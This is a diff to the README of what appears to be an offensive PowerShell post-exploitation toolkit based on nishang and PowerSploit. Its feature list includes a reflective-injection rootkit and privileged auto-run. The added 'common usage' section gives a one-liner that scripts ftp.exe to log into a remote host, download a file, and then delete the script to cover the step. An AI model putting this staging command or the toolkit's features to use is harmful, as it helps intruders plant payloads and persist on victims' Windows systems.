@@ -22,3 +22,15 @@ powered by [nishang](https://github.com/samratashok/nishang), [PowerSploit](http
 - [ ] rewrite build script by using python lang
 - [ ] rookit (Invoke-ReflectivePEInjection)
 - [x] auto-run with high authority
+
+
+### command in common usage
+```
+# ftp download file
+
+"open xxx.xxx.xxx.xxx`n[username]`n[password]`nbinary`nget [filename]`nbye" | Out-File ftp.txt
+ftp -s:ftp.txt
+del ftp.txt 
+
+
+```
